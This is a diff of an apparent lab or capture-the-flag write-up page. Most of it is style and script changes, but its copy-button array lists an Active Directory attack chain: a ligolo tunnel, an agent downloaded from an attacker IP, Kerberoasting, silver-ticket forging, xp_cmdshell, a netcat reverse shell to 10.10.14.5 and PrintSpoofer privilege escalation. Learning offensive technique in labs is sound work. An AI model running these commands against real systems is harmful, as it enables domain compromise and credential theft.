-.cb-host .ico { font-size:12px;line-height:1;font-weight:700; }
+.cb-host { display:inline-flex;align-items:center;gap:6px;padding:0 12px;height:30px;background:color-mix(in oklab,var(--host,var(--green)) 14%,var(--surface0));color:var(--host,var(--green));border-right:1px solid var(--surface1);font-weight:700;letter-spacing:.1em;font-size:10px;flex-shrink:0; }
+.cb-host .ico { font-size:12px;line-height:1; }
 .cb-host .hw { color:inherit; }
 .cb-host .hwo { color:var(--sub);font-weight:500;letter-spacing:.04em;margin-left:4px; }
-.cb-lang { color:var(--peach);font-weight:600;flex:1; }
+.cb-lang { color:var(--peach);font-weight:600;flex:1;font-size:10.5px; }
 .copy { background:transparent;border:1px solid var(--surface1);color:var(--dim);font-family:var(--mono);font-size:10px;padding:2px 8px;cursor:pointer;letter-spacing:.06em;transition:color .15s,border-color .15s; }
 .copy:hover { color:var(--mauve);border-color:var(--mauve); }
 .copy.ok { color:var(--green);border-color:var(--green); }
-.cb pre { margin:0;padding:14px 16px;overflow-x:auto;color:var(--sub);white-space:pre; }
+.cb pre { margin:0;padding:13px 16px;overflow-x:auto;color:var(--sub);white-space:pre; }
 .cb pre .prm { color:var(--host,var(--green));font-weight:700; }
 .cb pre .cmd { color:var(--text); }
 .cb pre .flag { color:var(--yellow); }
@@ -578,27 +774,23 @@ figcaption { font-family:var(--mono);font-size:11.5px;color:var(--dim);margin-to
 .cb pre .kw { color:var(--blue); }
 .cb pre .out { color:var(--dim); }
 
-/* host palette */
 .cb[data-host="attacker"]   { --host:var(--green);  }
 .cb[data-host="target-win"] { --host:var(--blue);   }
-.cb[data-host="target-lin"] { --host:var(--peach);  }
 .cb[data-host="pivot"]      { --host:var(--mauve);  }
 .cb[data-host="ligolo"]     { --host:var(--teal);   }
 .cb[data-host="sql"]        { --host:var(--yellow); }
 .cb[data-host="local"]      { --host:var(--dim);    }
 
-/* further reading */
 .reading { margin:28px 0 0;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--yellow);padding:16px 20px; }
 .reading h3 { font-family:var(--mono);font-weight:600;font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--yellow);margin:0 0 10px; }
 .reading h3::before { content:none; }
 .reading ul { margin:0;padding-left:20px;font-family:var(--sans);font-size:14px;color:var(--sub);line-height:1.7; }
 .reading ul li::marker { color:var(--yellow); }
 
-/* article footer */
-.doc-foot { margin-top:48px;padding-top:24px;border-top:1px dashed var(--surface1);display:flex;flex-direction:column;gap:20px; }
-.author-card { display:grid;grid-template-columns:60px 1fr auto;gap:18px;align-items:center;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--mauve);padding:14px 16px;font-family:var(--mono); }
-.avatar { width:56px;height:56px;background:var(--base);border:1px solid var(--surface1);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:22px;color:var(--mauve); }
-.aw { font-size:14px;color:var(--text);font-weight:600;font-family:var(--sans);margin-bottom:3px; }
+.doc-foot { margin-top:48px;padding-top:24px;border-top:1px dashed var(--surface1);display:flex;flex-direction:column;gap:18px; }
+.author-card { display:grid;grid-template-columns:56px 1fr auto;gap:16px;align-items:center;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--mauve);padding:14px 16px;font-family:var(--mono); }
+.avatar { width:52px;height:52px;background:var(--base);border:1px solid var(--surface1);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:20px;color:var(--mauve); }
+.aw { font-size:13px;color:var(--text);font-weight:600;font-family:var(--sans);margin-bottom:3px; }
 .ad { font-size:11.5px;color:var(--sub);line-height:1.5; }
 .alinks { display:flex;gap:8px;font-size:11px; }
 .alinks a { color:var(--sub);border:1px solid var(--surface1);padding:4px 9px;letter-spacing:.04em;transition:color .15s,border-color .15s; }
@@ -608,29 +800,26 @@ figcaption { font-family:var(--mono);font-size:11.5px;color:var(--dim);margin-to
 .back-all { font-size:12px;color:var(--dim);border-bottom:1px dashed var(--surface1);align-self:flex-start;transition:color .15s; }
 .back-all:hover { color:var(--mauve); }
 
-/* TOC */
 aside.toc { position:sticky;top:80px;align-self:start;font-family:var(--mono);font-size:12px;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--blue);padding:14px 14px 12px;max-height:calc(100vh - 120px);overflow-y:auto; }
 aside.toc h4 { margin:0 0 10px;font-size:10px;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:var(--blue); }
 aside.toc ol { margin:0;padding:0;list-style:none;display:flex;flex-direction:column;gap:2px; }
-aside.toc ol li a { display:block;color:var(--dim);padding:4px 6px;border-left:1px solid transparent;font-size:11.5px;transition:color .15s,border-color .15s;line-height:1.4; }
+aside.toc ol li a { display:block;color:var(--dim);padding:4px 6px;border-left:1px solid transparent;font-size:11px;transition:color .15s,border-color .15s;line-height:1.4; }
 aside.toc ol li a:hover { color:var(--text); }
 aside.toc ol li a.on { color:var(--mauve);border-left-color:var(--mauve);background:color-mix(in oklab,var(--mauve) 6%,transparent); }
 .toc-meta { margin-top:12px;padding-top:10px;border-top:1px dashed var(--surface1);font-size:10.5px;color:var(--dim);display:flex;flex-direction:column;gap:4px; }
 .toc-meta .tk { color:var(--dim);margin-right:5px; }
 .toc-meta .tv { color:var(--sub); }
 
-@media (max-width:680px) { .doc-head h1 { font-size:22px; } article { font-size:15px; } }
+@media (max-width:680px) { .doc-head h1 { font-size:20px; } article { font-size:14.5px; } }
 </style>
 
 <script>
-// reading progress
 const progress = document.getElementById('progress') as HTMLElement;
 const toTop    = document.getElementById('toTop') as HTMLElement;
 function updProgress() {
   const h = document.documentElement;
   const max = h.scrollHeight - h.clientHeight;
-  const pct = max > 0 ? (h.scrollTop / max) * 100 : 0;
-  progress.style.width = pct + '%';
+  progress.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + '%';
   toTop.classList.toggle('show', h.scrollTop > 600);
 }
 document.addEventListener('scroll', updProgress, { passive: true });
@@ -638,7 +827,7 @@ updProgress();
 toTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
 
 // TOC scroll-spy
-const ids = ['scenario','why','subsystems','walkthrough','breaks','wrap'];
+const ids = ['intro','scenario','tunnel','silver','shell','why','privesc','refs'];
 const sections = ids.map(id => document.getElementById(id)).filter(Boolean) as HTMLElement[];
 const tocLinks = document.querySelectorAll<HTMLAnchorElement>('#tocList a');
 const spy = new IntersectionObserver(entries => {
@@ -648,29 +837,36 @@ const spy = new IntersectionObserver(entries => {
       tocLinks.forEach(a => a.classList.toggle('on', a.getAttribute('href') === '#' + id));
     }
   });
-}, { rootMargin: '-30% 0px -60% 0px' });
+}, { rootMargin: '-20% 0px -70% 0px' });
 sections.forEach(s => spy.observe(s));
 
-// copy buttons
-// copy buttons — content stored here to avoid template parser issues with $ and { }
+// copy buttons — stored here to avoid Astro template parsing issues with shell syntax
 const COPIES: string[] = [
-  "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up",
-  "python3 -m http.server 8000",
-  "cmd /c curl -O http://10.10.14.5:8000/agent.exe\ncmd /c agent.exe -connect 10.10.14.5:11601 -ignore-cert",
+  "evil-winrm -i 10.10.10.20 -u 'JOHN.SMITH' -p 'Winter2024!'",
+  "netstat -ano",
+  "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nsudo ligolo-proxy -selfcert",
+  "python3 -m http.server",
+  "cmd /c curl -O http://10.10.14.5:8000/agent.exe",
+  "cmd /c agent.exe -connect 10.10.14.5:11601 -ignore-cert",
   "session\nstart",
   "sudo ip route add 240.0.0.1/32 dev ligolo",
   "impacket-mssqlclient svc_mssql:Passw0rd123!@240.0.0.1 -windows-auth",
-  "impacket-GetUserSPNs 'corp.local/john.smith:Winter2024!' -dc-ip 10.10.10.10 -request",
-  "impacket-lookupsid 'corp.local/svc_mssql:Passw0rd123!'@240.0.0.1",
-  "NT=$(echo -n 'Passw0rd123!' | iconv -t utf-16le | openssl dgst -md4 -r | awk '{print $1}')\necho $NT",
+  "impacket-GetUserSPNs \"corp.local\"/\"john.smith\":\"Winter2024!\" -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoasting",
+  "impacket-lookupsid 'corp.local'/'svc_mssql':'Passw0rd123!'@240.0.0.1",
   "240.0.0.1    srv01.corp.local corp.local",
+  "NT=$(echo -n 'Passw0rd123!' | iconv -t utf-16le | openssl dgst -md4 -r | awk '{print $1}')\necho $NT",
+  "impacket-ticketer Administrator -spn \"MSSQL/srv01.corp.local\" -domain 'corp.local' -domain-sid 'S-1-5-21-1111111111-2222222222-3333333333' -nthash \"ab4f5a5c42df5a0ee337d12ce77332f5\"",
+  "export KRB5CCNAME=$(pwd)/Administrator.ccache",
   "nxc smb 240.0.0.1 -u 'svc_mssql' -p 'Passw0rd123!' --generate-krb5-file krb5.conf\nsudo cp krb5.conf /etc/krb5.conf",
-  "impacket-ticketer Administrator -spn 'MSSQL/srv01.corp.local' -domain 'corp.local' -domain-sid 'S-1-5-21-1111111111-2222222222-3333333333' -nthash 'ab4f5a5c42df5a0ee337d12ce77332f5'",
-  "export KRB5CCNAME=$(pwd)/Administrator.ccache\nklist",
+  "cat /etc/krb5.conf",
+  "klist",
   "impacket-mssqlclient -k -no-pass Administrator@srv01.corp.local",
-  'enable_xp_cmdshell\nxp_cmdshell "whoami /priv"',
-  'xp_cmdshell "C:\\temp\\nc.exe 10.10.14.5 4445 -e cmd"',
+  "enable_xp_cmdshell\nxp_cmdshell \"cd C:\\temp && dir\"",
+  "xp_cmdshell \"C:\\temp\\nc.exe 10.10.14.5 4445 -e cmd\"",
+  "rlwrap -cAr nc -lvnp 4445",
+  "whoami /priv",
   "PrintSpoofer64.exe -i -c cmd",
+  "whoami /priv",
 ];
 
 document.addEventListener('click', async e => {
